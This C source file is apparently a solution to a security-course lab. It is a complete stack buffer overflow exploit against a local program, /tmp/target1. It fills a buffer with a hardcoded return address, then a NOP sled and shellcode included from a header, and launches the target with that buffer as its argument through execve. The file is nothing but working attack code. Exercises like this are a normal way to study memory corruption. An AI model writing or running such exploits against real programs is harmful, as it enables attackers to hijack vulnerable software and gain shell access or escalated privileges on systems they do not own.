#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "";
  args[2] = NULL;
  env[0] = NULL;

  char *buffer;
  int bsize = 240 + 100;

  if (!(buffer = malloc(bsize)))
  {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  int address = 0xbffffc30;

  int i;
  int *buff_parser = (int *)buffer;

  // Setup the buffer
  for (i = 0; i < bsize; i += 4)
  {
    *(buff_parser++) = address;
  }

  for (i = 0; i < bsize / 2; i++)
  {
    buffer[i] = NOP;
  }
  char *ptr_shell = buffer;
  ptr_shell = buffer + ((bsize / 2) - (strlen(shellcode) / 2));

  for (i = 0; i < strlen(shellcode); i++)
  {
    *(ptr_shell++) = shellcode[i];
  }

  buffer[bsize - 1] = '\0';

  args[1] = buffer;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
